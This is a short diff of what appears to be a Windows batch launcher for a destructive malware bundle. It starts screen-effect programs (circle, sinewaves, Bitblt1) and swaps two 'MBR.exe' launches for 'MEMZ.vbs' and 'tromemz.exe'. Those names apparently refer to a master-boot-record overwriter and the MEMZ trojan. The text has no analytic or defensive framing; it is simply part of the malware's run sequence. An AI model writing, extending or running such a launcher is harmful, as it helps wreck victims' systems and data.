@@ -13,8 +13,8 @@ start circle.exe
 start sinewaves.exe
 timeout 9
 start Bitblt1.exe
-start MBR.exe
-start MBR.exe
+start MEMZ.vbs
+start tromemz.exe
 start circle.exe
 start sinewaves.exe
 start Bitblt1.exe
